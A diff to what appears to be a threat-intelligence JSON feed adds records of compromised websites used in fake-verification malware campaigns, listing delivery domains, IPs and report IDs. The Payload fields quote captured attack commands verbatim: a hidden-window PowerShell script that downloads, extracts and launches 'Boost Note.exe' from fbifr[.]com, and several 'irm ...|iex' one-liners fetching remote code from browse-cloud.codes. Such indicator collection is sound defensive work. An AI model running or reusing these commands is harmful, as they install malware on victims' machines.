@@ -319,5 +319,154 @@
     ],
     "ReportId": "cmwk6eeiu1ajo0omlb9q6d1o1",
     "ScannedAt": "2026-11-17T04:11:57.901000+00:00"
+  },
+  {
+    "UrlDomain": "framingandconcrete.com",
+    "DeliveryUrl": [
+      "makeverizyjar.info",
+      "lovezramexar.info",
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "74.208.236.40"
+    ],
+    "Related": [
+      {
+        "Value": "https://fbifr.com",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwk7z4jk1cpj0oml1mhvj0hz",
+    "ScannedAt": "2026-11-17T04:56:04.341000+00:00"
+  },
+  {
+    "UrlDomain": "forsttrading.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "46.36.219.130"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/ab3e1159cf4003f0",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=05eba1c31d40ace2c6cfb4801839c576e960a14858198764&amp;_v=29914850",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&amp;_v=29914850",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=05eba1c31d40ace2c6cfb4801839c576e960a14858198764&_v=29914850",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b&_v=29914850",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/ab3e1159cf4003f0'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/ab3e1159cf4003f0"
+    ],
+    "ReportId": "cmwk7suho1cfq0omld9d1w1rp",
+    "ScannedAt": "2026-11-17T04:51:11.370000+00:00"
+  },
+  {
+    "UrlDomain": "yenbang.vn",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "150.95.113.47"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/6212895d940eee1b",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/6212895d940eee1b'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/6212895d940eee1b"
+    ],
+    "ReportId": "cmwk7l7dl1c9k0omlhbc6eque",
+    "ScannedAt": "2026-11-17T04:45:14.847000+00:00"
+  },
+  {
+    "UrlDomain": "bigeasyhealthspa.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "31.170.161.67"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/85e8889097dc6cfd",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/85e8889097dc6cfd'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/85e8889097dc6cfd"
+    ],
+    "ReportId": "cmwk7kmpm1c6m0oml0aps1e2q",
+    "ScannedAt": "2026-11-17T04:44:48.075000+00:00"
+  },
+  {
+    "UrlDomain": "swissschoolofbeauty.in",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "93.127.179.95"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwk7dpqm1bx70omli9yupclo",
+    "ScannedAt": "2026-11-17T04:39:25.383000+00:00"
+  },
+  {
+    "UrlDomain": "logtechbrasil.com.br",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.241.63.24"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/8ee2e4aa1b2fe006",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/8ee2e4aa1b2fe006'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/8ee2e4aa1b2fe006"
+    ],
+    "ReportId": "cmwk7brz41bwj0omlleavf342",
+    "ScannedAt": "2026-11-17T04:37:54.985000+00:00"
   }
 ]
